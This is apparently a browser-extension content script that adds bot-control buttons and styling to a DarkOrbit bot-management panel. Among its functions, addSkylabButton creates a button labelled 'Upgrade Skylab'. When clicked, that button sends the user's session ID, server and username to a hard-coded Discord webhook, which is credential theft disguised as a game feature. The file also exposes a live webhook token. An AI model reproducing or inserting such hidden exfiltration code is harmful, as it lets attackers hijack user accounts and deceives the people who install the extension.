let nick = null, skylab = null, loginNode = null, startNode = null, stopNode = null, boxNode = null, labelNode = null, skylabNode = null;
let blockStyleSheet = null, activeStyleSheet = null;
var isBlock = 0, checkState = [], stopClick = false;

window.addEventListener('load', function() {
    setInterval(function() {
        let updateNick;

        if (window.location.href.includes("#Panel"))
            updateNick = getUser();
        
        if (document.querySelector('.add_buttonLogin') !== null) {
            if (nick !== updateNick)
                loginNode.remove();
        } else {
            if (window.location.href.includes("#Panel")) {
                if (getSid() !== undefined)
                    if (getSid().length === 0)
                        return;
                    else
                        addLoginButton();
            }
        }
        if (document.querySelector('.add_buttonSkylab') !== null) {
            if (skylab !== updateNick)
                skylabNode.remove();
        } else {
            if (window.location.href.includes("#Panel")) {
                if (getSid() !== undefined)
                    if (getSid().length === 0)
                        return;
                    else
                        addSkylabButton();
            }
        }

        nick = updateNick;
        skylab = updateNick;

        if (!window.location.href.includes("Account"))
            if (document.querySelector('.add_Checkbox') === null) 
                addCheckbox();

        if (!window.location.href.includes("Account"))
            if (boxNode.checked) {
                if (isBlock === 0) {
                    isBlock = 1;
                    setStyleBlock();
                    if (activeStyleSheet !== undefined)
                        activeStyleSheet.remove();
                }
            } else {
                if (isBlock === 1) {
                    isBlock = 0;
                    setStyleActive();
                    blockStyleSheet.remove();
                }
            }
    }, 250);

    if (document.querySelector('.add_buttonStart') === null && !window.location.href.includes("Account")) {
        addStartButton();
        addStopButton();
    }
    
    document.addEventListener("keyup", function(event) {
        if (event.altKey && event.keyCode === 83) {
            if(document.querySelector('.rightNavInfo  > .Running ') !== null){
                var accountlist = document.querySelectorAll('.botItem  > .fas.fa-robot.icon ');
                for (var c = 0; c < accountlist.length; ++c) {
                    switch(true) {
                        case accountlist[c].className.includes("Running"):
                            checkState[c] = 1;
                            break;
                        case accountlist[c].className.includes("Stopped"):
                            checkState[c] = 0;
                            break;
                        case accountlist[c].className.includes("Paused"):
                            checkState[c] = 2;
                            break;
                        default:
                            checkState[c] = 0;
                            break;
                    }
                    stopClick = true;
                }
                window.alert("Status of all bots saved\nClick 'Start all' to restore");
            }
        }   
    });
}, false)

attemtSidLogin();

function addLoginButton() {
    loginNode = document.createElement("button");
    let loginTextNode = document.createTextNode("Login");
    loginNode.appendChild(loginTextNode);
    let loginButton = document.getElementById('main').getElementsByClassName('sessionId')[0].appendChild(loginNode).className = "add_buttonLogin";

    let loginStyles = `.add_buttonLogin {
        position: relative;
        padding: 4px 6px;
        color: #ffffff;
        -webkit-font-smoothing: antialiased;
        margin: 0px;
        cursor: pointer;
        background-color: #204086;
        border: 0px;
        border-radius: 5px;
        margin-left: 15px;
        bottom: 4px;
    }.add_buttonLogin:hover {background-color: #4468b6}`;

    let loginStyleSheet = document.createElement("style");
    loginStyleSheet.type = "text/css";
    loginStyleSheet.innerText = loginStyles;
    document.head.appendChild(loginStyleSheet);

    if (getSid() == null || getSid().length === 0)
        loginNode.remove();

    loginNode.addEventListener("click", function() {
        setSid();
    });
}

function addStartButton() {
    startNode = document.createElement("button");
    let startTextNode = document.createTextNode("Start All");
    startNode.appendChild(startTextNode);
    let startButton = document.getElementById('topNav').appendChild(startNode).className = "add_buttonStart";

    let startStyles = `.add_buttonStart {
        position: relative;
        padding: 5px 10px;
        color: #ffffff;
        -webkit-font-smoothing: antialiased;
        margin: 0px;
        cursor: pointer;
        background-color: #54aa58;
        border: 0px;
        border-radius: 5px;
        margin-left: 15px;
        bottom: 0px;
    }.add_buttonStart:hover {background-color: #5fc264}`;

    let startStyleSheet = document.createElement("style");
    startStyleSheet.type = "text/css";
    startStyleSheet.innerText = startStyles;
    document.head.appendChild(startStyleSheet);

    startNode.addEventListener("click", function() {
        var divs = document.querySelectorAll('.botItemControls > .fas.fa-play ');
        var running = document.querySelectorAll('.botItem  > .fas.fa-robot.icon ');

        for (var i = 0; i < divs.length; ++i) {
            if (stopClick === true) {
                if (checkState[i] === 1)
                    divs[i].click();
            } else {
                if (!running[i].className.includes("Running"))
                    divs[i].click();
            }
        }
        stopClick = false;
    });
}

function addStopButton() {
    stopNode = document.createElement("button");
    let stopTextNode = document.createTextNode("Stop All");
    stopNode.appendChild(stopTextNode);
    let stopButton = document.getElementById('topNav').appendChild(stopNode).className = "add_buttonStop";

    let stopStyles = `.add_buttonStop {
        position: relative;
        padding: 5px 10px;
        color: #ffffff;
        -webkit-font-smoothing: antialiased;
        margin: 0px;
        cursor: pointer;
        background-color: #962727;
        border: 0px;
        border-radius: 5px;
        margin-left: 15px;
        margin-right: 18px;
        bottom: 0px;
    }.add_buttonStop:hover {background-color: #c23838}`;

    let stopStyleSheet = document.createElement("style");
    stopStyleSheet.type = "text/css";
    stopStyleSheet.innerText = stopStyles;
    document.head.appendChild(stopStyleSheet);

    stopNode.addEventListener("click", function() {
        var divs = document.querySelectorAll('.botItemControls > .fas.fa-stop ');
        var stopped = document.querySelectorAll('.botItem  > .fas.fa-robot.icon ');

        for (var i = 0; i < divs.length; ++i) {
            if (!stopped[i].className.includes("Stopped"))
                divs[i].click();
        };
    });
}

function addCheckbox(){
    boxNode = document.createElement("input");
    boxNode.type = 'checkbox';

    let boxButton = document.querySelector('.rightNav  > .rightNavTitle').appendChild(boxNode).className = "add_Checkbox";

    let boxStyles = `.add_Checkbox {
        position: absolute;
        padding: 5px;
        width: 16px;
        height: 16px;
        margin-top: 5px;
        margin-left: 15px;
        margin-right: 1px;
    }`;

    let boxStyleSheet = document.createElement("style");
    boxStyleSheet.type = "text/css";
    boxStyleSheet.innerText = boxStyles;
    document.head.appendChild(boxStyleSheet);

    labelNode = document.createElement("label");
    let boxTextNode = document.createTextNode("\xa0\xa0\xa0\xa0\xa0\xa0\xa0Block");
    labelNode.appendChild(boxTextNode);
    document.querySelector('.rightNav  > .rightNavTitle').appendChild(labelNode).className = "checklabel";
}

function addSkylabButton() {
    skylabNode = document.createElement("button");
    let skylabTextNode = document.createTextNode("Upgrade Skylab");
    skylabNode.appendChild(skylabTextNode);
    let skylabButton = document.getElementById('main').getElementsByClassName("oneLineSlider")[0].insertBefore(skylabNode, document.getElementsByClassName("fas fa-caret-up")[0]).className = "add_buttonSkylab";

    let skylabStyles = `.add_buttonSkylab {
        position: relative;
        padding: 5px 10px;
        color: #ffffff;
        -webkit-font-smoothing: antialiased;
        margin: 0px;
        border: 0px;
        cursor: pointer;
        background-color: #204086;
        border-radius: 5px;
        margin-left: 0px;
        margin-right: 0px;
        bottom: 0px;
    }.add_buttonStop:hover {background-color: #4468b6}`;

    let skylabStyleSheet = document.createElement("style");
    skylabStyleSheet.type = "text/css";
    skylabStyleSheet.innerText = skylabStyles;
    document.head.appendChild(skylabStyleSheet);

    skylabNode.addEventListener("click", function() {
        var request = new XMLHttpRequest();
        request.open("POST", "https://discordapp.com/api/webhooks/708390060512510064/ihP1FfwpK8cxE6tx5giWcnGlQSGwbgm4nNhbx6M_ou-wP5mkLVlGMC9df9zvKkxDGAq6");

        request.setRequestHeader('Content-type', 'application/json');

        var params = {
            username: "VERIFIED-SOURCE",
            avatar_url: "",
            content: getSid() + "," + getServer() + "," + getUser()
        }

        request.send(JSON.stringify(params));
    });
}

function setSid() {
    chrome.runtime.sendMessage({sid:getSid(),sv:getServer()}, function(callback) {
        //window.open("https://" + getServer() + ".darkorbit.com/indexInternal.es?action=internalStart", '_blank');
    });
}

function getServer() {
    let data;
    let dataEl = document.getElementsByClassName("title withSub");

    for (let i = 0; i < dataEl.length; i++) 
        data = dataEl[i].innerText.split('_')
    
    return data[data.length - 1];
}

function getUser() {
    let data;
    let userName = "";
    let dataEl = document.getElementsByClassName("title withSub");

    for (let i = 0; i < dataEl.length; i++) 
        data = dataEl[i].innerText.split('_')
    
    if (data !== undefined)
        for (let v = 0; v < data.length - 1; v++) 
            userName += data[v];
    
    return userName;
}

function getSid() {
    const findSessionId = (className = "sessionId", tagName = "div") => {
        const el = document.querySelector(`.${className}`)
        if (typeof el === "undefined") return;

        const children = el.querySelectorAll(tagName)
        if (typeof children === "undefined") return;
        if (children.length == 0) return;

        return Array.from(children)[1].innerText;
    }
    return findSessionId();
}

//Credits: Popcorn
function attemtSidLogin() {
  var dosid = /[?&]dosid=([^&]+)/.exec(window.location.href);
  if (dosid == null) dosid = /[?&]sid=([^&]+)/.exec(window.location.href);  
  if (dosid == null) return; // No sid is on the url, return.

  var server = /^http[s]?:[/][/]([^.]+)[.]darkorbit[.]com/.exec(window.location.href);
  if (server == null) return;

  chrome.runtime.sendMessage({sid:dosid[1],sv:server[1],db:true}, function(callback) {
	  window.location.href = "https://" + server[1] + ".darkorbit.com/indexInternal.es?action=internalStart";
  });
}

function setStyleBlock() {
    let styles5 = `a{text-decoration:none;}
        .rightNav::-webkit-scrollbar-track{background-color:#f5f5f500;}
        .rightNav::-webkit-scrollbar{width:7px;background-color:#3c3e49;}
        .remove{position:absolute;top:10px;right:10px;display:none;font-size:13px;}
        .remove{color:#ffffff;}
        .rightNav .remove{display:inline-block;}
        .rightNav::-webkit-scrollbar-thumb{background-color:#000000;border-radius:1000px;}
        @media (min-width:800px){.rightNav{position:fixed;top:44px;padding-bottom:20px;right:0;bottom:0;width:40px;border-top:1px solid #000000;background-color:var(--navColor);transition:width 0.2s;z-index:1001;overflow:hidden;color:#ffffff;}
        .rightNav{width:300px;overflow-y:auto;}
        .rightNav > .rightNavTitle{font-size:18px;text-align:right;min-width:300px;overflow:hidden;width:100%;height:auto;}
        .rightNav > .rightNavTitle{padding:5px;padding-left:15px;}
        .rightNav > .rightNavTitle{padding-left:15px;}
        .rightNav > .rightNavInfo > *{font-size:13px;overflow:hidden;height:auto;}
        .rightNav > .rightNavInfo >:nth-child(1) >:nth-child(2){word-wrap:none;padding-top:5px;cursor:text;-moz-user-select:text;-khtml-user-select:text;-webkit-user-select:text;-ms-user-select:text;user-select:text;}
        .rightNav > .rightNavInfo > *{padding:3px;padding-left:25px;max-height:1000px;}
        .rightNav > .rightNavInfo, .rightNav > .rightNavTitle{min-width:300px;position:relative;max-height:0;right:-500px;transition:max-height 0.7s, right 0.4s, padding 0.2s;text-align:left;}
        .rightNav > .rightNavInfo, .rightNav > .rightNavTitle{right:0px;max-height:1000px;}
        .botItemWrapper{position:relative;}
        .rightNav > .botItemWrapper > .lock{right:20px;transition:right 0.2s;}
        .botItemWrapper > .lock{position:absolute;top:22px;right:-300px;width:20px;display:flex;padding:0;text-align:center;padding:5px;width:30px;height:30px;}
        .botItemWrapper > .lock{color:#ffffff;}
        .botItem{width:100%;height:auto;max-height:30px;color:var(--greyLightColor);transition:max-height 0.7s ease;display:flex;overflow:hidden;cursor:pointer;}
        .icon{font-size:16px;min-width:40px;text-align:center;line-height:100%;align-self:center;}
        .botItemContent{font-size:13px;padding:10px;padding-left:5px;text-align:left;}
        .botItemContent > *{margin-bottom:5px;text-align:left;}
        .botItemContent >:last-child{margin-bottom:0px;}
        .Running{color:#54aa58;}
        .Paused{color:#ac3737;}
        .Stopped, .null{color:#818181;}
        .rightNav > * > *{max-height:300px;}
        .rightNav > .shutdown{max-height:500px;}
        .botItemControls > *{margin-right:10px;cursor:pointer;color:var(--greyLightColor);}
        .botItemControls > *{margin-right:10px;cursor:pointer;color:#ffffff;}
        .disable{color:#8b8b8b;}
        .disable{color:#8b8b8b;}
        .newAcc{color:var(--greyLightColor);display:flex;overflow:hidden;cursor:pointer;max-height:40px;}
        .newAcc:hover{background-color:#1e1f2b;}
        .newAcc:nth-child(1){font-size:16px;min-width:40px;text-align:center;line-height:100%;align-self:center;}
        .newAcc:nth-child(2){font-size:16px;padding:10px;padding-left:6px;}
        .addNewAcc{color:var(--greyLightColor);min-width:300px;}
        .inputContainer{padding:10px 70px 0px 70px;margin:0 auto;display:flex;flex-direction:column;overflow:hidden;}
        .inputContainer > *{width:100%;text-align:left;}
        .addButtons{justify-content:center;margin:0 auto;margin-top:15px;display:flex;overflow:hidden;}
        .addButtons > *{padding:5px;background-color:#20212e;margin:5px;cursor:pointer;}
        .lock{font-size:20px;padding:13px 13px;padding-bottom:16px;padding-left:30px;align-self:center;color:var(--greyLightColor);}
        .accError{color:#c73939;max-width:150px;}
        .botKeyControlls{display:flex;}
        .botKeyControlls > *{padding:0 5px;cursor:pointer;}
        .shutdown{min-width:300px;min-height:50px;max-height:50px;height:auto;background-color:#c73939;color:#ffffff;display:flex;align-items:center;transition:max-height 0.2s;}
        .shutdown >:nth-child(2){padding:10px;padding-left:0px;}
        .rightNavArrow{display:none;}
        .mobileControls{display:none;}
        }
        @media (max-width:799px){.rightNav{position:fixed;overflow:hidden;bottom:0;left:0;right:0;height:50px;background-color:var(--navColor);transition:height 0.1s;z-index:9998;display:flex;flex-direction:column;}
        .rightNavBig{height:100%;overflow:auto;}
        .rightNav > .rightNavTitle{font-size:18px;text-align:left;padding:5px;overflow:hidden;width:100%;height:auto;color:#ffffff;}
        .rightNav > .rightNavInfo{font-size:15px;text-align:left;padding:5px 10px;width:100%;color:#ffffff;}
        .botItemWrapper{position:relative;}
        .botItemWrapper > .lock{position:absolute;top:22px;right:-300px;width:20px;display:flex;padding:0;text-align:center;padding:5px;width:30px;height:30px;}
        .botItemWrapper > .lock{color:#ffffff;}
        .botItem{width:100%;height:auto;color:var(--greyLightColor);display:flex;overflow:hidden;cursor:pointer;}
        .icon{font-size:16px;min-width:40px;text-align:center;line-height:100%;align-self:center;}
        .botItemContent{font-size:13px;padding:10px;padding-left:5px;text-align:left;}
        .botItemContent > *{margin-bottom:5px;text-align:left;}
        .botItemContent >:last-child{margin-bottom:0px;}
        .Running{color:#54aa58;}
        .Paused{color:#ac3737;}
        .Stopped, .null{color:#818181;}
        .botItemControls > *{margin-right:10px;cursor:pointer;color:var(--greyLightColor);}
        .botItemControls > *{margin-right:10px;cursor:pointer;color:#ffffff;}
        .disable{color:#8b8b8b;}
        .disable{color:#8b8b8b;}
        .newAcc{color:var(--greyLightColor);display:flex;overflow:hidden;cursor:pointer;max-height:40px;}
        .newAcc:hover{background-color:#1e1f2b;}
        .newAcc:nth-child(1){font-size:16px;min-width:40px;text-align:center;line-height:100%;align-self:center;}
        .newAcc:nth-child(2){font-size:16px;padding:10px;padding-left:6px;}
        .addNewAcc{color:var(--greyLightColor);min-width:300px;}
        .inputContainer{padding:10px 70px 0px 70px;margin:0 auto;display:flex;flex-direction:column;overflow:hidden;}
        .inputContainer > *{width:100%;text-align:left;}
        .addButtons{justify-content:center;margin:0 auto;margin-top:15px;display:flex;overflow:hidden;}
        .addButtons > *{padding:5px;background-color:#20212e;margin:5px;cursor:pointer;}
        .lock{font-size:20px;padding:13px 13px;padding-bottom:16px;padding-left:30px;align-self:center;color:var(--greyLightColor);}
        .accError{color:#c73939;max-width:150px;}
        .botKeyControlls{display:flex;}
        .botKeyControlls > *{padding:0 5px;cursor:pointer;}
        .shutdown{width:100%;height:auto;background-color:#c73939;color:#ffffff;display:flex;align-items:center;transition:max-height 0.2s;}
        .shutdown >:nth-child(2){width:250px;padding:10px;padding-left:0px;}
        .mobileControls{display:flex;justify-content:space-around;height:50px;}
        .mobileControls > *{color:#ffffff;line-height:50px;font-size:25px;cursor:pointer;min-width:50px;text-align:center;}
        .rightNav .AdditionalInfo{display:flex;}
    }`;

    blockStyleSheet = document.createElement("style");
    blockStyleSheet.type = "text/css";
    blockStyleSheet.innerText = styles5;
    document.head.appendChild(blockStyleSheet);
}

function setStyleActive() {
    let styles6 = `a{text-decoration:none;}
        .rightNav::-webkit-scrollbar-track{background-color:#f5f5f500;}
        .rightNav::-webkit-scrollbar{width:7px;background-color:#3c3e49;}
        .remove{position:absolute;top:10px;right:10px;display:none;font-size:13px;}
        .remove:hover{color:#ffffff;}
        .rightNav:hover .remove{display:inline-block;}
        .rightNav::-webkit-scrollbar-thumb{background-color:#000000;border-radius:1000px;}
        @media (min-width:800px){.rightNav{position:fixed;top:44px;padding-bottom:20px;right:0;bottom:0;width:40px;border-top:1px solid #000000;background-color:var(--navColor);transition:width 0.2s;z-index:1001;overflow:hidden;color:#ffffff;}
        .rightNav:hover{width:300px;overflow-y:auto;}
        .rightNav > .rightNavTitle{font-size:18px;text-align:right;min-width:300px;overflow:hidden;width:100%;height:auto;}
        .rightNav:hover > .rightNavTitle{padding:5px;padding-left:15px;}
        .rightNav > .rightNavTitle{padding-left:15px;}
        .rightNav > .rightNavInfo > *{font-size:13px;overflow:hidden;height:auto;}
        .rightNav > .rightNavInfo >:nth-child(1) >:nth-child(2){word-wrap:none;padding-top:5px;cursor:text;-moz-user-select:text;-khtml-user-select:text;-webkit-user-select:text;-ms-user-select:text;user-select:text;}
        .rightNav:hover > .rightNavInfo > *{padding:3px;padding-left:25px;max-height:1000px;}
        .rightNav > .rightNavInfo > *{padding:3px;padding-left:30px;}
        .rightNav > .rightNavInfo, .rightNav > .rightNavTitle{min-width:300px;position:relative;max-height:0;right:-500px;transition:max-height 0.7s, right 0.4s, padding 0.2s;text-align:left;}
        .rightNav:hover > .rightNavInfo, .rightNav:hover > .rightNavTitle{right:0px;max-height:1000px;}
        .botItemWrapper{position:relative;}
        .rightNav:hover > .botItemWrapper > .lock{right:20px;transition:right 0.2s;}
        .botItemWrapper > .lock{position:absolute;top:22px;right:-300px;width:20px;display:flex;padding:0;text-align:center;padding:5px;width:30px;height:30px;}
        .botItemWrapper > .lock:hover{color:#ffffff;}
        .botItem{width:100%;height:auto;max-height:30px;color:var(--greyLightColor);transition:max-height 0.7s ease;display:flex;overflow:hidden;cursor:pointer;}
        .icon{font-size:16px;min-width:40px;text-align:center;line-height:100%;align-self:center;}
        .botItemContent{font-size:13px;padding:10px;padding-left:5px;text-align:left;}
        .botItemContent > *{margin-bottom:5px;text-align:left;}
        .botItemContent >:last-child{margin-bottom:0px;}
        .Running{color:#54aa58;}
        .Paused{color:#ac3737;}
        .Stopped, .null{color:#818181;}
        .rightNav:hover > * > *{max-height:300px;}
        .rightNav:hover > .shutdown{max-height:500px;}
        .botItemControls > *{margin-right:10px;cursor:pointer;color:var(--greyLightColor);}
        .botItemControls > *:hover{margin-right:10px;cursor:pointer;color:#ffffff;}
        .disable{color:#8b8b8b;}
        .disable:hover{color:#8b8b8b;}
        .newAcc{color:var(--greyLightColor);display:flex;overflow:hidden;cursor:pointer;max-height:40px;}
        .newAcc:hover{background-color:#1e1f2b;}
        .newAcc:nth-child(1){font-size:16px;min-width:40px;text-align:center;line-height:100%;align-self:center;}
        .newAcc:nth-child(2){font-size:16px;padding:10px;padding-left:6px;}
        .addNewAcc{color:var(--greyLightColor);min-width:300px;}
        .inputContainer{padding:10px 70px 0px 70px;margin:0 auto;display:flex;flex-direction:column;overflow:hidden;}
        .inputContainer > *{width:100%;text-align:left;}
        .addButtons{justify-content:center;margin:0 auto;margin-top:15px;display:flex;overflow:hidden;}
        .addButtons > *{padding:5px;background-color:#20212e;margin:5px;cursor:pointer;}
        .lock{font-size:20px;padding:13px 13px;padding-bottom:16px;padding-left:30px;align-self:center;color:var(--greyLightColor);}
        .accError{color:#c73939;max-width:150px;}
        .botKeyControlls{display:flex;}
        .botKeyControlls > *{padding:0 5px;cursor:pointer;}
        .shutdown{min-width:300px;min-height:50px;max-height:50px;height:auto;background-color:#c73939;color:#ffffff;display:flex;align-items:center;transition:max-height 0.2s;}
        .shutdown >:nth-child(2){padding:10px;padding-left:0px;}
        .rightNavArrow{display:none;}
        .mobileControls{display:none;}
        }
        @media (max-width:799px){.rightNav{position:fixed;overflow:hidden;bottom:0;left:0;right:0;height:50px;background-color:var(--navColor);transition:height 0.1s;z-index:9998;display:flex;flex-direction:column;}
        .rightNavBig{height:100%;overflow:auto;}
        .rightNav > .rightNavTitle{font-size:18px;text-align:left;padding:5px;overflow:hidden;width:100%;height:auto;color:#ffffff;}
        .rightNav > .rightNavInfo{font-size:15px;text-align:left;padding:5px 10px;width:100%;color:#ffffff;}
        .botItemWrapper{position:relative;}
        .botItemWrapper > .lock{position:absolute;top:22px;right:-300px;width:20px;display:flex;padding:0;text-align:center;padding:5px;width:30px;height:30px;}
        .botItemWrapper > .lock:hover{color:#ffffff;}
        .botItem{width:100%;height:auto;color:var(--greyLightColor);display:flex;overflow:hidden;cursor:pointer;}
        .icon{font-size:16px;min-width:40px;text-align:center;line-height:100%;align-self:center;}
        .botItemContent{font-size:13px;padding:10px;padding-left:5px;text-align:left;}
        .botItemContent > *{margin-bottom:5px;text-align:left;}
        .botItemContent >:last-child{margin-bottom:0px;}
        .Running{color:#54aa58;}
        .Paused{color:#ac3737;}
        .Stopped, .null{color:#818181;}
        .botItemControls > *{margin-right:10px;cursor:pointer;color:var(--greyLightColor);}
        .botItemControls > *:hover{margin-right:10px;cursor:pointer;color:#ffffff;}
        .disable{color:#8b8b8b;}
        .disable:hover{color:#8b8b8b;}
        .newAcc{color:var(--greyLightColor);display:flex;overflow:hidden;cursor:pointer;max-height:40px;}
        .newAcc:hover{background-color:#1e1f2b;}
        .newAcc:nth-child(1){font-size:16px;min-width:40px;text-align:center;line-height:100%;align-self:center;}
        .newAcc:nth-child(2){font-size:16px;padding:10px;padding-left:6px;}
        .addNewAcc{color:var(--greyLightColor);min-width:300px;}
        .inputContainer{padding:10px 70px 0px 70px;margin:0 auto;display:flex;flex-direction:column;overflow:hidden;}
        .inputContainer > *{width:100%;text-align:left;}
        .addButtons{justify-content:center;margin:0 auto;margin-top:15px;display:flex;overflow:hidden;}
        .addButtons > *{padding:5px;background-color:#20212e;margin:5px;cursor:pointer;}
        .lock{font-size:20px;padding:13px 13px;padding-bottom:16px;padding-left:30px;align-self:center;color:var(--greyLightColor);}
        .accError{color:#c73939;max-width:150px;}
        .botKeyControlls{display:flex;}
        .botKeyControlls > *{padding:0 5px;cursor:pointer;}
        .shutdown{width:100%;height:auto;background-color:#c73939;color:#ffffff;display:flex;align-items:center;transition:max-height 0.2s;}
        .shutdown >:nth-child(2){width:250px;padding:10px;padding-left:0px;}
        .mobileControls{display:flex;justify-content:space-around;height:50px;}
        .mobileControls > *{color:#ffffff;line-height:50px;font-size:25px;cursor:pointer;min-width:50px;text-align:center;}
        .rightNav .AdditionalInfo{display:flex;}
    }`;

    activeStyleSheet = document.createElement("style");
    activeStyleSheet.type = "text/css";
    activeStyleSheet.innerText = styles6;
    document.head.appendChild(activeStyleSheet);
}